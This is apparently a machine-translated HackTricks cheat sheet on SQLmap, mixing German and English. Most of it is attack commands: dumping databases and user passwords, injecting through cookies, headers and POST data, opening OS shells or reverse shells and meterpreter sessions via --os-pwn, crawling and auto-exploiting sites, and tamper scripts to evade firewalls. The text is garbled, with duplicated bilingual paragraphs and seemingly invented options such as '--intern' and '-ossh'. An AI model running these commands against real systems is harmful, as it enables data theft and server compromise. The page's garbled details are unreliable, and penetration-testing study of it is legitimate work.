<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


# Grundlegende Argumente f√ºr SQLmap

## Generisch
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY
```
### Intern

#### Beschreibung

Die Option `--intern` erm√∂glicht es, Informationen √ºber die interne Struktur der Datenbank abzurufen.

#### Syntax

```plaintext
--intern
```

#### Beispiel

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --intern
```

#### Erkl√§rung

Die Option `--intern` erm√∂glicht es, Informationen √ºber die interne Struktur der Datenbank abzurufen. Dies kann hilfreich sein, um die Datenbank besser zu verstehen und m√∂gliche Schwachstellen zu identifizieren.
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
```
### DB-Daten

```plaintext
Parameter: id (GET)
    Typ: numerisch
    Beispiel: 1

[...]

[11:47:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:47:30] [INFO] fetching database names
[11:47:30] [INFO] fetching number of databases
[11:47:30] [INFO] resumed: 3
[11:47:30] [INFO] resumed: information_schema
[11:47:30] [INFO] resumed: mysql
[11:47:30] [INFO] resumed: test
available databases [3]:
[*] information_schema
[*] mysql
[*] test
```

Die Datenbank enth√§lt die folgenden Informationen:

```plaintext
Parameter: id (GET)
    Typ: numerisch
    Beispiel: 1

[...]

[11:47:30] [INFO] Das Back-End-DBMS ist MySQL
Back-End-DBMS: MySQL >= 5.0.12 (MariaDB-Fork)
[11:47:30] [INFO] Abrufen der Datenbanknamen
[11:47:30] [INFO] Abrufen der Anzahl der Datenbanken
[11:47:30] [INFO] Fortgesetzt: 3
[11:47:30] [INFO] Fortgesetzt: information_schema
[11:47:30] [INFO] Fortgesetzt: mysql
[11:47:30] [INFO] Fortgesetzt: test
Verf√ºgbare Datenbanken [3]:
[*] information_schema
[*] mysql
[*] test
```
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
# Injektionsstelle

## Von Burp/ZAP erfassen

Erfassen Sie die Anfrage und erstellen Sie eine req.txt-Datei
```bash
sqlmap -r req.txt --current-user
```
## GET-Anfrage-Injektion

In some cases, the injection can be performed directly in the URL parameters of a GET request. This type of injection is known as GET request injection.

In einigen F√§llen kann die Injektion direkt in den URL-Parametern einer GET-Anfrage durchgef√ºhrt werden. Diese Art der Injektion wird als GET-Anfrage-Injektion bezeichnet.

### Basic Syntax

The basic syntax for performing a GET request injection is as follows:

Die grundlegende Syntax f√ºr die Durchf√ºhrung einer GET-Anfrage-Injektion lautet wie folgt:

```
http://example.com/page.php?id=1' OR '1'='1
```

### Exploiting the Injection

To exploit the injection, we can use tools like SQLMap. SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities.

Um die Injektion auszunutzen, k√∂nnen wir Tools wie SQLMap verwenden. SQLMap ist ein leistungsstarkes Tool, das den Prozess der Erkennung und Ausnutzung von SQL-Injektionsl√ºcken automatisiert.

To use SQLMap for GET request injection, we can run the following command:

Um SQLMap f√ºr die GET-Anfrage-Injektion zu verwenden, k√∂nnen wir den folgenden Befehl ausf√ºhren:

```
sqlmap -u "http://example.com/page.php?id=1" --method GET --data "id=1" --level 5 --risk 3
```

This command tells SQLMap to target the URL `http://example.com/page.php?id=1` using the GET method. The `--level` and `--risk` parameters determine the aggressiveness of the scan.

Dieser Befehl gibt SQLMap den Befehl, die URL `http://example.com/page.php?id=1` mit der GET-Methode anzugreifen. Die Parameter `--level` und `--risk` bestimmen die Aggressivit√§t des Scans.

### Conclusion

GET request injection is a common technique used to exploit SQL injection vulnerabilities in web applications. By injecting malicious SQL code into the URL parameters, an attacker can manipulate the application's database and potentially gain unauthorized access to sensitive information.

Die GET-Anfrage-Injektion ist eine g√§ngige Technik, um SQL-Injektionsl√ºcken in Webanwendungen auszunutzen. Indem b√∂sartiger SQL-Code in die URL-Parameter injiziert wird, kann ein Angreifer die Datenbank der Anwendung manipulieren und m√∂glicherweise unbefugten Zugriff auf sensible Informationen erlangen.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
## POST-Anfrage-Injektion

In einigen F√§llen kann es erforderlich sein, eine SQL-Injektion in einer POST-Anfrage durchzuf√ºhren, anstatt sie in einer GET-Anfrage zu verwenden. Dies kann der Fall sein, wenn die Anwendung sensible Daten √ºber eine POST-Anfrage sendet oder wenn die Anwendung eine POST-Anfrage erfordert, um bestimmte Aktionen auszuf√ºhren.

Um eine POST-Anfrage-Injektion durchzuf√ºhren, k√∂nnen Sie das Tool SQLMap verwenden. SQLMap ist ein leistungsstarkes Werkzeug, das speziell f√ºr die Durchf√ºhrung von SQL-Injektionstests entwickelt wurde.

Um SQLMap f√ºr eine POST-Anfrage-Injektion zu konfigurieren, m√ºssen Sie die folgenden Parameter angeben:

- `--data`: Dieser Parameter enth√§lt die Daten, die in der POST-Anfrage gesendet werden.
- `--url`: Dieser Parameter enth√§lt die URL der Zielseite.
- `--method`: Dieser Parameter gibt die HTTP-Methode an, die f√ºr die Anfrage verwendet werden soll (normalerweise POST).

Ein Beispielbefehl f√ºr die Verwendung von SQLMap zur Durchf√ºhrung einer POST-Anfrage-Injektion lautet wie folgt:

```plaintext
sqlmap -r request.txt --url "http://example.com/login" --method POST
```

In diesem Beispiel wird die POST-Anfrage aus der Datei `request.txt` gelesen und an die URL `http://example.com/login` gesendet. SQLMap analysiert dann die Anfrage und versucht, eine SQL-Injektion zu erkennen und auszunutzen.

Es ist wichtig zu beachten, dass bei der Durchf√ºhrung einer POST-Anfrage-Injektion die Daten in der Anfrage m√∂glicherweise codiert oder verschl√ºsselt sind. In solchen F√§llen m√ºssen Sie m√∂glicherweise zus√§tzliche Schritte unternehmen, um die Daten zu decodieren oder zu entschl√ºsseln, bevor Sie SQLMap verwenden k√∂nnen.

Die Durchf√ºhrung einer POST-Anfrage-Injektion kann komplexer sein als eine GET-Anfrage-Injektion, er√∂ffnet jedoch zus√§tzliche M√∂glichkeiten, um Schwachstellen in einer Anwendung auszunutzen. Es ist wichtig, vorsichtig zu sein und sicherzustellen, dass Sie √ºber die erforderlichen Berechtigungen verf√ºgen, um eine solche Injektion durchzuf√ºhren.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## Injektionen in Headern und anderen HTTP-Methoden

In addition to injecting payloads in the URL parameters, SQL injection can also be performed by injecting payloads in the headers and other HTTP methods. This can be useful when the application is not vulnerable to traditional SQL injection attacks through URL parameters.

### Injection in Headers

Headers are an important part of the HTTP request and response. They contain information such as the user agent, cookies, and authentication tokens. By injecting payloads in the headers, an attacker can manipulate the behavior of the application.

To perform SQL injection in headers, you can use tools like SQLMap. SQLMap allows you to specify the headers to be used for injection using the `--headers` option. For example:

```
sqlmap -u http://example.com --headers="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
```

### Injection in Other HTTP Methods

Apart from the commonly used GET and POST methods, there are other HTTP methods like PUT, DELETE, and OPTIONS. These methods can also be vulnerable to SQL injection attacks.

To perform SQL injection in other HTTP methods, you can use tools like SQLMap. SQLMap allows you to specify the method to be used for injection using the `--method` option. For example:

```
sqlmap -u http://example.com --method=PUT
```

By injecting payloads in the headers and other HTTP methods, an attacker can exploit SQL injection vulnerabilities in different parts of the application, increasing the chances of a successful attack.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
## Injection zweiter Ordnung

Second order injection, also known as persistent or stored injection, is a type of SQL injection attack that occurs when user-supplied data is stored in a database and later used in a vulnerable query. Unlike traditional SQL injection, where the malicious payload is executed immediately, second order injection involves injecting malicious code that will be executed at a later time.

### How does second order injection work?

The process of second order injection involves the following steps:

1. User-supplied data is submitted to the application and stored in a database.
2. The application retrieves the stored data from the database and uses it in a vulnerable query without proper sanitization or validation.
3. The injected malicious code is executed when the vulnerable query is executed.

### Examples of second order injection

Here are a few examples to illustrate how second order injection can be exploited:

#### Example 1: Comment injection

Consider a blog application that allows users to post comments. The application stores the comments in a database and later displays them on the website. If the application does not properly sanitize or validate the user-supplied data, an attacker can inject malicious SQL code into a comment. When the comment is displayed on the website, the malicious code will be executed, potentially compromising the database.

#### Example 2: File upload vulnerability

In some cases, an application may allow users to upload files, which are then stored in a database. If the application does not properly validate or sanitize the file name, an attacker can upload a file with a malicious name that contains SQL code. When the file is later accessed or processed by the application, the malicious code will be executed.

### Mitigating second order injection

To protect against second order injection attacks, it is important to follow secure coding practices:

- Use parameterized queries or prepared statements to ensure that user-supplied data is properly sanitized before being used in a query.
- Implement input validation and filtering to prevent the submission of malicious data.
- Regularly update and patch your application to fix any known vulnerabilities.
- Conduct regular security audits and penetration testing to identify and address any potential vulnerabilities.

By following these best practices, you can significantly reduce the risk of second order injection attacks and protect your application and data from unauthorized access.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
## Shell

Eine der m√§chtigsten Funktionen von SQLMap ist die F√§higkeit, eine interaktive Shell auf dem Zielserver zu √∂ffnen. Dies erm√∂glicht es dem Angreifer, Befehle direkt auf dem Server auszuf√ºhren und eine vollst√§ndige Kontrolle √ºber das System zu erlangen.

Um eine Shell mit SQLMap zu √∂ffnen, verwenden Sie den Befehl `--os-shell` oder `-ossh`. Dieser Befehl √∂ffnet eine interaktive Shell auf dem Zielserver, die es Ihnen erm√∂glicht, Befehle auszuf√ºhren und mit dem System zu interagieren.

```plaintext
sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell
```

Sobald die Shell ge√∂ffnet ist, k√∂nnen Sie Befehle wie `ls`, `pwd`, `cat` und andere verwenden, um das Dateisystem zu erkunden und Dateien zu lesen oder zu √§ndern. Sie k√∂nnen auch Befehle wie `wget` oder `curl` verwenden, um Dateien herunterzuladen oder hochzuladen.

Es ist wichtig zu beachten, dass das √ñffnen einer Shell auf einem Zielserver illegal ist, es sei denn, Sie haben die ausdr√ºckliche Erlaubnis des Eigent√ºmers. Das Ausf√ºhren von Befehlen auf einem fremden System ohne Erlaubnis kann zu rechtlichen Konsequenzen f√ºhren. Stellen Sie sicher, dass Sie immer die geltenden Gesetze und Vorschriften einhalten, wenn Sie SQLMap oder andere Hacking-Tools verwenden.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
## Durchsuchen Sie eine Website mit SQLmap und automatisieren Sie den Exploit

SQLmap ist ein leistungsstolles Tool zur Durchf√ºhrung von SQL-Injection-Angriffen auf Webanwendungen. Es kann verwendet werden, um Schwachstellen in einer Website zu identifizieren und automatisch Exploits durchzuf√ºhren.

Um eine Website mit SQLmap zu durchsuchen und den Exploit automatisch auszuf√ºhren, k√∂nnen Sie den folgenden Befehl verwenden:

```bash
sqlmap -u <URL> --crawl=1 --batch --level=5 --risk=3
```

- `<URL>`: Die URL der zu durchsuchenden Website.

Dieser Befehl f√ºhrt eine Crawling-Operation auf der angegebenen Website durch und versucht, automatisch SQL-Injection-Schwachstellen zu identifizieren. Die Optionen `--crawl=1` aktivieren das Crawling, `--batch` erm√∂glicht den automatischen Modus, `--level=5` erh√∂ht die Intensit√§t der Tests auf maximales Niveau und `--risk=3` erh√∂ht das Risiko f√ºr die Durchf√ºhrung von Exploits.

SQLmap wird verschiedene Techniken verwenden, um die Schwachstellen zu identifizieren und den Exploit durchzuf√ºhren. Es wird versuchen, die Datenbankstruktur zu erkennen, Datenbanknamen abzurufen, Tabellen und Spalten zu extrahieren und schlie√ülich die Daten auszulesen oder zu manipulieren.

Es ist wichtig zu beachten, dass das Ausf√ºhren von SQL-Injection-Angriffen ohne die ausdr√ºckliche Zustimmung des Eigent√ºmers der Website illegal ist. SQLmap sollte nur zu Testzwecken auf autorisierten Systemen verwendet werden.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
# Einen Suffix festlegen

By default, SQLMap appends a suffix to the payload in order to identify the injection point. However, you can customize this suffix by using the `--suffix` option. This can be useful in scenarios where the default suffix is causing issues or conflicts with the target application.

```plaintext
$ sqlmap -u "http://example.com/vuln.php?id=1" --suffix="custom_suffix"
```

This command will set the suffix to "custom_suffix" and SQLMap will use it to identify the injection point in the target URL.

Keep in mind that the suffix should be unique and not interfere with the target application's functionality.
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
## Pr√§fix
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
## Hilfe bei der Suche nach einer booleschen Injection

Boolean Injection ist eine Technik, bei der versucht wird, eine SQL-Injection durch Ausnutzung von booleschen Ausdr√ºcken in einer Anwendung zu erreichen. Diese Methode erm√∂glicht es uns, Informationen aus der Datenbank abzurufen, indem wir gezielte Abfragen stellen und die Antwort anhand der erhaltenen Ergebnisse interpretieren.

Um eine boolesche Injection zu finden, k√∂nnen wir das Tool SQLMap verwenden. SQLMap ist ein leistungsstarkes Werkzeug, das speziell f√ºr die Erkennung und Ausnutzung von SQL-Injection-Schwachstellen entwickelt wurde.

Um SQLMap zu verwenden, m√ºssen wir die URL der anf√§lligen Anwendung angeben und den Parameter identifizieren, der anf√§llig f√ºr eine SQL-Injection ist. Wir k√∂nnen dies tun, indem wir die Anwendung manuell √ºberpr√ºfen oder andere Techniken wie das Crawling der Website oder das √úberpr√ºfen des Quellcodes verwenden.

Sobald wir den anf√§lligen Parameter identifiziert haben, k√∂nnen wir SQLMap verwenden, um die boolesche Injection zu testen. SQLMap wird automatisch verschiedene boolesche Ausdr√ºcke in die Anfrage einf√ºgen und die Antwort interpretieren, um festzustellen, ob die Anwendung anf√§llig ist.

Um SQLMap f√ºr die boolesche Injection zu verwenden, k√∂nnen wir den folgenden Befehl ausf√ºhren:

```plaintext
sqlmap -u <URL> --data "<Parameter>=<Wert>" --technique B
```

Hierbei m√ºssen wir `<URL>` durch die URL der anf√§lligen Anwendung und `<Parameter>` durch den anf√§lligen Parameter ersetzen. `<Wert>` ist der Wert, den wir f√ºr den Parameter verwenden m√∂chten.

SQLMap wird dann verschiedene boolesche Ausdr√ºcke in die Anfrage einf√ºgen und die Antwort analysieren, um festzustellen, ob die Anwendung anf√§llig ist. Wenn eine boolesche Injection gefunden wird, gibt SQLMap die erzielten Ergebnisse aus.

Es ist wichtig zu beachten, dass das Ausf√ºhren von SQLMap auf einer Anwendung ohne Zustimmung des Eigent√ºmers illegal ist. Stellen Sie sicher, dass Sie die erforderlichen Berechtigungen haben, bevor Sie dieses Tool verwenden.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
## Manipulation

Die `tamper` Option erm√∂glicht es, die Anfragen und Antworten w√§hrend des Angriffs zu manipulieren. Dies kann hilfreich sein, um WAFs (Web Application Firewalls) zu umgehen oder spezifische Angriffsszenarien anzupassen.

### Verwendung

Die `tamper` Option kann mit dem `--tamper` Flag verwendet werden, gefolgt von dem Namen der gew√ºnschten Manipulations-Technik. Mehrere Techniken k√∂nnen durch Kommas getrennt angegeben werden.

```plaintext
--tamper=<Technik(en)>
```

### Beispiele

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment
```

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,randomcase
```

### Verf√ºgbare Techniken

- `apostrophemask`: Maskiert einzelne Anf√ºhrungszeichen mit einem Backslash.
- `apostrophenullencode`: Kodiert einzelne Anf√ºhrungszeichen als NULL (%00).
- `appendnullbyte`: F√ºgt ein NULL-Byte (%00) am Ende der Payload hinzu.
- `base64encode`: Kodiert die Payload mit Base64.
- `between`: F√ºgt die Payload zwischen den Zeichen einer Zeichenkette ein.
- `bluecoat`: F√ºgt ein Leerzeichen vor jedem Zeichen der Payload ein.
- `chardoubleencode`: Kodiert jeden Zeichen der Payload als zwei Hexadezimalzeichen.
- `charencode`: Kodiert jeden Zeichen der Payload als Hexadezimalwert.
- `charunicodeencode`: Kodiert jeden Zeichen der Payload als Unicode-Wert.
- `equaltolike`: Ersetzt Gleichheitszeichen (=) durch LIKE-Operatoren.
- `escapequotes`: Maskiert einzelne Anf√ºhrungszeichen mit einem Backslash.
- `greatest`: Ersetzt Gleichheitszeichen (=) durch GREATEST-Funktion.
- `halfversionedmorekeywords`: F√ºgt zus√§tzliche reservierte W√∂rter hinzu.
- `ifnull2ifisnull`: Ersetzt IFNULL-Funktion durch IF(ISNULL())-Konstruktion.
- `modsecurityversioned`: F√ºgt zus√§tzliche reservierte W√∂rter hinzu.
- `modsecurityzeroversioned`: F√ºgt zus√§tzliche reservierte W√∂rter hinzu.
- `multiplespaces`: F√ºgt mehrere Leerzeichen zwischen den Zeichen der Payload ein.
- `nonrecursivereplacement`: Ersetzt reservierte W√∂rter durch ihre Nicht-Rekursive-√Ñquivalente.
- `percentage`: Kodiert jeden Zeichen der Payload als Prozentzeichen gefolgt von zwei Hexadezimalzeichen.
- `randomcase`: √Ñndert die Gro√ü- und Kleinschreibung der Zeichen in der Payload.
- `randomcomments`: F√ºgt zuf√§llige SQL-Kommentare hinzu.
- `securesphere`: F√ºgt ein Leerzeichen vor jedem Zeichen der Payload ein.
- `space2comment`: Ersetzt Leerzeichen durch SQL-Kommentare.
- `space2dash`: Ersetzt Leerzeichen durch Bindestriche (-).
- `space2hash`: Ersetzt Leerzeichen durch Hash-Zeichen (#).
- `space2morehash`: Ersetzt Leerzeichen durch mehrere Hash-Zeichen (#).
- `space2mssqlblank`: Ersetzt Leerzeichen durch Leerzeichen in einer MSSQL-Anweisung.
- `space2mssqlhash`: Ersetzt Leerzeichen durch Hash-Zeichen (#) in einer MSSQL-Anweisung.
- `space2mysqlblank`: Ersetzt Leerzeichen durch Leerzeichen in einer MySQL-Anweisung.
- `space2mysqldash`: Ersetzt Leerzeichen durch Bindestriche (-) in einer MySQL-Anweisung.
- `space2plus`: Ersetzt Leerzeichen durch Pluszeichen (+).
- `space2randomblank`: Ersetzt Leerzeichen durch zuf√§llige Anzahl von Leerzeichen.
- `symboliclogical`: Ersetzt logische Operatoren durch ihre symbolischen √Ñquivalente.
- `unionalltounion`: Ersetzt UNION ALL durch UNION.
- `unmagicquotes`: Entfernt Magic Quotes aus der Payload.
- `versionedkeywords`: F√ºgt zus√§tzliche reservierte W√∂rter hinzu.
- `versionedmorekeywords`: F√ºgt zus√§tzliche reservierte W√∂rter hinzu.
- `xor`: XOR-Verschl√ºsselung der Payload mit einem Schl√ºssel.
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper | Beschreibung |
| :--- | :--- |
| apostrophemask.py | Ersetzt das Apostroph-Zeichen durch sein UTF-8-Vollbreiten-Gegenst√ºck |
| apostrophenullencode.py | Ersetzt das Apostroph-Zeichen durch sein illegales doppeltes Unicode-Gegenst√ºck |
| appendnullbyte.py | F√ºgt am Ende der Nutzlast ein codiertes NULL-Byte-Zeichen hinzu |
| base64encode.py | Wandelt alle Zeichen in der angegebenen Nutzlast in Base64 um |
| between.py | Ersetzt den gr√∂√üer-als-Operator \('&gt;'\) durch 'NOT BETWEEN 0 AND \#' |
| bluecoat.py | Ersetzt das Leerzeichen nach der SQL-Anweisung durch ein g√ºltiges zuf√§lliges Leerzeichen. Ersetzt anschlie√üend das Zeichen '=' durch den LIKE-Operator |
| chardoubleencode.py | Verdoppelt die URL-Codierung aller Zeichen in der angegebenen Nutzlast \(bereits codierte Zeichen werden nicht verarbeitet\) |
| commalesslimit.py | Ersetzt Vorkommen wie 'LIMIT M, N' durch 'LIMIT N OFFSET M' |
| commalessmid.py | Ersetzt Vorkommen wie 'MID\(A, B, C\)' durch 'MID\(A FROM B FOR C\)' |
| concat2concatws.py | Ersetzt Vorkommen wie 'CONCAT\(A, B\)' durch 'CONCAT\_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)' |
| charencode.py | URL-codiert alle Zeichen in der angegebenen Nutzlast \(bereits codierte Zeichen werden nicht verarbeitet\) |
| charunicodeencode.py | Unicode-URL-codiert nicht codierte Zeichen in der angegebenen Nutzlast \(bereits codierte Zeichen werden nicht verarbeitet\). "%u0022" |
| charunicodeescape.py | Unicode-URL-codiert nicht codierte Zeichen in der angegebenen Nutzlast \(bereits codierte Zeichen werden nicht verarbeitet\). "\u0022" |
| equaltolike.py | Ersetzt alle Vorkommen des Gleichheitsoperators \('='\) durch den Operator 'LIKE' |
| escapequotes.py | Schr√§gstrich-escapiert Anf√ºhrungszeichen \(' and "\) |
| greatest.py | Ersetzt den gr√∂√üer-als-Operator \('&gt;'\) durch den entsprechenden 'GREATEST'-Operator |
| halfversionedmorekeywords.py | F√ºgt jedem Schl√ºsselwort einen versionierten MySQL-Kommentar hinzu |
| ifnull2ifisnull.py | Ersetzt Vorkommen wie 'IFNULL\(A, B\)' durch 'IF\(ISNULL\(A\), B, A\)' |
| modsecurityversioned.py | Umh√ºllt die vollst√§ndige Abfrage mit einem versionierten Kommentar |
| modsecurityzeroversioned.py | Umh√ºllt die vollst√§ndige Abfrage mit einem null-versionierten Kommentar |
| multiplespaces.py | F√ºgt mehrere Leerzeichen um SQL-Schl√ºsselw√∂rter hinzu |
| nonrecursivereplacement.py | Ersetzt vordefinierte SQL-Schl√ºsselw√∂rter durch geeignete Darstellungen f√ºr den Ersatz \(z.B. .replace\("SELECT", ""\)\) Filter |
| percentage.py | F√ºgt jedem Zeichen ein Prozentzeichen \('%'\) voran |
| overlongutf8.py | Konvertiert alle Zeichen in der angegebenen Nutzlast \(bereits codierte Zeichen werden nicht verarbeitet\) |
| randomcase.py | Ersetzt jedes Schl√ºsselwort-Zeichen durch einen zuf√§lligen Gro√ü-/Kleinschreibungswert |
| randomcomments.py | F√ºgt zuf√§llige Kommentare zu SQL-Schl√ºsselw√∂rtern hinzu |
| securesphere.py | F√ºgt einen speziell erstellten String hinzu |
| sp\_password.py | F√ºgt 'sp\_password' am Ende der Nutzlast hinzu, um eine automatische Verschleierung in den DBMS-Protokollen zu erreichen |
| space2comment.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch Kommentare |
| space2dash.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch einen Bindestrich-Kommentar \('--'\) gefolgt von einer zuf√§lligen Zeichenkette und einem Zeilenumbruch \('\n'\) |
| space2hash.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch ein Rauten-Zeichen \('\#'\) gefolgt von einer zuf√§lligen Zeichenkette und einem Zeilenumbruch \('\n'\) |
| space2morehash.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch ein Rauten-Zeichen \('\#'\) gefolgt von einer zuf√§lligen Zeichenkette und einem Zeilenumbruch \('\n'\) |
| space2mssqlblank.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch ein zuf√§lliges Leerzeichen aus einer g√ºltigen Menge alternativer Zeichen |
| space2mssqlhash.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch ein Rauten-Zeichen \('\#'\) gefolgt von einem Zeilenumbruch \('\n'\) |
| space2mysqlblank.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch ein zuf√§lliges Leerzeichen aus einer g√ºltigen Menge alternativer Zeichen |
| space2mysqldash.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch einen Bindestrich-Kommentar \('--'\) gefolgt von einem Zeilenumbruch \('\n'\) |
| space2plus.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch ein Plus-Zeichen \('+'\) |
| space2randomblank.py | Ersetzt das Leerzeichen-Zeichen \(' '\) durch ein zuf√§lliges Leerzeichen aus einer g√ºltigen Menge alternativer Zeichen |
| symboliclogical.py | Ersetzt die logischen Operatoren AND und OR durch ihre symbolischen Gegenst√ºcke \(&& und |
| unionalltounion.py | Ersetzt UNION ALL SELECT durch UNION SELECT |
| unmagicquotes.py | Ersetzt das Anf√ºhrungszeichen-Zeichen \('\) durch eine mehrbyte-Kombination %bf%27 zusammen mit einem generischen Kommentar am Ende \(um es funktionieren zu lassen\) |
| uppercase.py | Ersetzt jedes Schl√ºsselwort-Zeichen durch den Gro√übuchstabenwert 'INSERT' |
| varnish.py | F√ºgt einen HTTP-Header 'X-originating-IP' hinzu |
| versionedkeywords.py | Umschlie√üt jedes nicht-funktionale Schl√ºsselwort mit einem versionierten MySQL-Kommentar |
| versionedmorekeywords.py | Umschlie√üt jedes Schl√ºsselwort mit einem versionierten MySQL-Kommentar |
| xforwardedfor.py | F√ºgt einen gef√§lschten HTTP-Header 'X-Forwarded-For' hinzu |



<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
